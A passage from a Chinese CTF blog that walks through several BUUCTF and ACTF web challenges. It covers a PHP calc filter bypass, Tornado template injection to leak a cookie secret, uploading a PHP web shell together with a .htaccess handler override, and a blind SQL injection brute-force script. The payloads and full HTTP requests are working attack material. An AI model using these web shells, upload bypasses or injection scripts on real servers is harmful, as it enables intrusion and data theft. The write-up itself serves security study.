class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;dev&quot;</span> [<span class="hljs-number">6</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;etc&quot;</span> [<span class="hljs-number">7</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;f1agg&quot;</span> [<span class="hljs-number">8</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;home&quot;</span> [<span class="hljs-number">9</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;lib&quot;</span> [<span class="hljs-number">10</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;lib64&quot;</span> [<span class="hljs-number">11</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;media&quot;</span> [<span class="hljs-number">12</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;mnt&quot;</span> [<span class="hljs-number">13</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;opt&quot;</span> [<span class="hljs-number">14</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;proc&quot;</span> [<span class="hljs-number">15</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;root&quot;</span> [<span class="hljs-number">16</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;run&quot;</span> [<span class="hljs-number">17</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;sbin&quot;</span> [<span class="hljs-number">18</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;srv&quot;</span> [<span class="hljs-number">19</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;start.sh&quot;</span> [<span class="hljs-number">20</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;sys&quot;</span> [<span class="hljs-number">21</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tmp&quot;</span> [<span class="hljs-number">22</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;usr&quot;</span> [<span class="hljs-number">23</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;var&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>读取flag：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node5.buuoj.cn:<span class="hljs-number">28453</span>/calc.php?%<span class="hljs-number">20</span>num=var_dump(file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)))<br><br><span class="hljs-attribute">string</span>(<span class="hljs-number">43</span>) <span class="hljs-string">&quot;flag&#123;89404a0c-0948-4a18-9f87-40f1050cc23f&#125; &quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="notice-4"><a href="#notice-4" class="headerlink" title="notice:"></a>notice:</h2><p>scandir( )<br>这是一个在C语言中用于扫描目录内容的函数，它允许开发者检索目录中的文件和子目录信息。这个函数在Linux系统编程中非常有用，尤其是当你需要处理文件系统或者进行目录操作时。</p>
<p>var_dump( )：<br>这是PHP的一个内置函数，用于输出变量的详细信息，包括类型和值。</p>
<p>file_get_contents( )：<br>这是PHP的一个内置函数，用于读取文件内容并返回为字符串。</p>
<p>chr( )：<br>这是PHP的一个内置函数，用于将ASCII码值转换为对应的字符。</p>
<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>模板注入题<br>没接触过，想直接去看wp了<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73734159/article/details/134360691">https://blog.csdn.net/m0_73734159/article/details/134360691</a><br>很详细，  </p>
<p>记一回tornado模板注入，虽然没做过两道模板注入的题  </p>
<p>点开flag看到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">/flag.txt<br>flag <span class="hljs-keyword">in</span> /fllllllllllllag<br><br>url:/file?filename=/flag.txt&amp;filehash=02521e013bf12f2ed07267cbbb4476da<br></code></pre></td></tr></table></figure>
<p>修改filehash:<br>&#x2F;error?msg&#x3D;Error<br>验证完后确定使用tornado模板注入（wp）  </p>
<p>查看hint得到计算公式 md5(cookie_secret+md5(filename))<br>知道要拿到cookie_secret,<br>用handler.sttings查看环境变量  </p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;<span class="hljs-number">42b45411</span>-b944-<span class="hljs-number">4058</span>-a294-92333eecacef&#x27;&#125;<br></code></pre></td></tr></table></figure>
<p>计算hash值<br>md5(&#x2F;fllllllllllllag)&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>cookie_secret&#x3D;42b45411-b944-4058-a294-92333eecacef<br>md5(md5(&#x2F;fllllllllllllag)+cookie_secret)&#x3D;baf2694028f23612a3c77cb63b9b9dd8</p>
<p>最后payload：<br>&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;baf2694028f23612a3c77cb63b9b9dd8</p>
<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>这题的note写过了，本替换搞没了，这次就独立做过当温习吧<br>开局艾克和孙笑川，jpeg直接传也传不了，文件有1m限制，<br>题目一直不提示改上传什么类型的文件有点难受，<br>最后试出来mmie传 image&#x2F;png 就行<br>直接传了  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>411<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryPX5AuupbBQqkGiE6<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=40c31c5302fc21595b5a1fb9e36ac7ff<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;php.png&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">一键去世</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6--</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-built_in">Warning</span>: mkdir(): File <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> /var/www/html/upload.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">23</span></span><br><span class="language-pgsql">/var/www/html/upload/c27817d096552162de80b210a4855ce1/php.png succesfully uploaded!</span><br></code></pre></td></tr></table></figure>
<p>直接蚁剑访问访问不了，应该就是目录不会进行php解析的原因<br>利用.htaccess,上传.htaccess文件</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>340<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvBTzoKhzTjekoPjH<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=40c31c5302fc21595b5a1fb9e36ac7ff<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">SetHandler application/x-httpd-php</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">一键去世</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH--</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-built_in">Warning</span>: mkdir(): File <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> /var/www/html/upload.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">23</span></span><br><span class="language-pgsql">/var/www/html/upload/c27817d096552162de80b210a4855ce1/.htaccess succesfully uploaded!</span><br></code></pre></td></tr></table></figure>
<p>蚁剑访问<br><a target="_blank" rel="noopener" href="http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/upload/c27817d096552162de80b210a4855ce1/php.png">http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/upload/c27817d096552162de80b210a4855ce1/php.png</a><br>成功  </p>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>漏洞详情：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44032232/article/details/108998564">https://blog.csdn.net/weixin_44032232/article/details/108998564</a></p>
<h1 id="ACTF-upload（未解出）"><a href="#ACTF-upload（未解出）" class="headerlink" title="ACTF upload（未解出）"></a>ACTF upload（未解出）</h1><p>又跑去actf坐牢了😭，做不出来也把进度放这</p>
<p>先要注册用户来登录，试了admin账户，服务器不给  </p>
<p>传正常图片<br><a target="_blank" rel="noopener" href="http://223.112.5.141:63478/upload?file_path=9db39573-994f-464f-b1fe-97c1e9897fb9_test.jpeg">http://223.112.5.141:63478/upload?file_path=9db39573-994f-464f-b1fe-97c1e9897fb9_test.jpeg</a><br>访问正常回显图片  </p>
<p>传马：<br><a target="_blank" rel="noopener" href="http://223.112.5.141:63478/upload?file_path=5ce41be5-7154-493f-b21b-84dd6a200111_php.php">http://223.112.5.141:63478/upload?file_path=5ce41be5-7154-493f-b21b-84dd6a200111_php.php</a><br>不回显代码，回显：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png;base64,PHNjcmlwdCBsYW5ndWFnZT0ncGhwJz5ldmFsKCRfR0VUWyJ6Il0pOzwvc2NyaXB0Pg==&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Uploaded Image&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>是base64编码后的马<br>试一下直接上传base64：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+<br></code></pre></td></tr></table></figure>
<p>不行  </p>
<p>看一下d导的分析：  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml">关键分析<br>服务器处理逻辑：<br><br>上传的内容被包裹在 <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png;base64,...&quot;</span>&gt;</span> 中，说明服务器将文件内容强制转换为 Base64 图片。<br><br>但返回的 Base64 数据 (PHNjcmlwdCBsYW5ndWFnZT0ncGhwJz5ldmFsKCRfR0VUWyJ6Il0pOzwvc2NyaXB0Pg==) 解码后正是你上传的原始代码：<br><br>php<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&quot;z&quot;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>这意味着服务器可能同时做了两件事：<br><br>将文件内容保存到磁盘（如 uploads/shell.php）。<br><br>生成一个包含该内容的 Base64 图片用于前端展示。<br><br>潜在漏洞点：<br><br>如果服务器保存了原始文件（如 .php），且文件名可控，可直接访问该文件执行代码。<br><br>如果服务器仅返回 Base64 图片但未保存原始文件，需另寻他法。<br></code></pre></td></tr></table></figure>
<p>试一下对upload文件  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">223.112</span>.<span class="hljs-number">5.141</span>:<span class="hljs-number">63478</span><span class="hljs-regexp">/upload?file_path=flag.txthttp:/</span><span class="hljs-regexp">/223.112.5.141:63478/u</span>pload?file_path=flag.txt<br></code></pre></td></tr></table></figure>
<p>对upload试了一下目录穿越，不行，  </p>
<p>伪协议<br>encode，无法读取文件，<br>decode，无法读取文件</p>
<p>注意到无论上传什么文件服务器默认当作imag&#x2F;png文件处理</p>
<p><a target="_blank" rel="noopener" href="http://223.112.5.141:53908/upload?file_path=http://127.0.0.1/flag.txt">http://223.112.5.141:53908/upload?file_path=http://127.0.0.1/flag.txt</a><br>不行<br>放弃了，等wp  </p>
<hr>
<h2 id="title-note-32date-2025-05-01-02-13-13tags-web"><a href="#title-note-32date-2025-05-01-02-13-13tags-web" class="headerlink" title="title: note-32date: 2025-05-01 02:13:13tags: web"></a>title: note-32<br>date: 2025-05-01 02:13:13<br>tags: web</h2><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>buucft里提示有sql，上来给了个输入框，但是是post而，抓包看：  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">4</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Origin</span>: http://cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>然后就是对id进行注入了,<br>用bp fuzz一下,大概过滤了</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">空格<br>or<br><span class="hljs-string">||</span><br>and<br><span class="hljs-meta">&amp;&amp;</span><br><span class="hljs-string">&quot;</span><br><span class="hljs-punctuation">;</span><br>&#x27;xmlupdate()<br>/**/<br>`<br></code></pre></td></tr></table></figure>
<p>试出如下</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">1^(length(database())=2)<br><br>若是length是对的会返回：<br><span class="hljs-keyword">Error </span>Occured When Fetch Result.<br><br>否则返回：<br>Hello, glzjin wants a girlfriend.<br></code></pre></td></tr></table></figure>
<p>由此可以对进行盲注<br>先用bp已经测试出数据库长度为11；<br>找个脚本改改：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># str= &quot;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&quot;</span><br>url = <span class="hljs-string">&#x27;http://69638964-21bc-445d-a323-6de57b0ff6bb.node5.buuoj.cn:81/&#x27;</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">10</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.2</span>) <br>        payload = <span class="hljs-string">&#x27;1^(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(i,l)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing 数据库名称第:&quot;</span>,i,<span class="hljs-string">&quot;第个&quot;</span>,<span class="hljs-built_in">chr</span>(l),<span class="hljs-string">&quot;字符&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name+<span class="hljs-built_in">chr</span>(l)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名称：&quot;</span>,name)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># flag=&#x27;&#x27;</span><br><span class="hljs-comment"># for l in range (1,10000):</span><br><span class="hljs-comment">#     f=&#x27;&#x27;</span><br><span 